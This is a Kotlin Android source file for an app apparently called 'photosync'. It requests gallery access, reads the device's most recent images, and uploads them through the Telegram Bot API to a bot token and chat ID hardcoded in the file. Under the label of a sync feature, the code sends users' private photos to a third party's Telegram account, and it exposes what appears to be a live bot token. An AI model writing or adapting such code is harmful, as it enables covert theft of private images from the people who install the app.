package com.example.photosync

import android.Manifest
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.provider.MediaStore
import android.widget.Button
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import okhttp3.*
import java.io.File
import java.io.InputStream

class MainActivity : AppCompatActivity() {

    private val client = OkHttpClient()
    private val botToken = "7974517832:AAEJSxSO3FYFj93h6rXOlWfYleskO1b6zFI"
    private val chatId = "5547937090" // Replace with your numeric user id

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val button = Button(this).apply { text = "Upload Photos Automatically" }
        setContentView(button)

        button.setOnClickListener {
            checkPermissionAndUpload()
        }
    }

    private fun checkPermissionAndUpload() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
            != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_MEDIA_IMAGES),
                100
            )
        } else {
            autoUploadPhotos()
        }
    }

    private fun autoUploadPhotos() {
        GlobalScope.launch(Dispatchers.IO) {
            val imageUris = getAllImages()
            imageUris.take(3).forEach { uri -> // limit to first 3 for demo
                uploadToTelegram(uri)
            }
        }
        runOnUiThread {
            Toast.makeText(this, "Uploading your recent photos...", Toast.LENGTH_SHORT).show()
        }
    }

    private fun getAllImages(): List<Uri> {
        val uriList = mutableListOf<Uri>()
        val projection = arrayOf(MediaStore.Images.Media._ID)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, sortOrder
        )

        cursor?.use {
            val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (it.moveToNext()) {
                val id = it.getLong(idColumn)
                val contentUri = Uri.withAppendedPath(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
                )
                uriList.add(contentUri)
            }
        }
        return uriList
    }

    private fun uploadToTelegram(imageUri: Uri) {
        try {
            val inputStream: InputStream? = contentResolver.openInputStream(imageUri)
            val requestBody = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart(
                    "photo", "upload.jpg",
                    RequestBody.create(MediaType.parse("image/jpeg"), inputStream!!.readBytes())
                )
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$botToken/sendPhoto")
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    println("Upload failed: ${response.message()}")
                }
            }

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
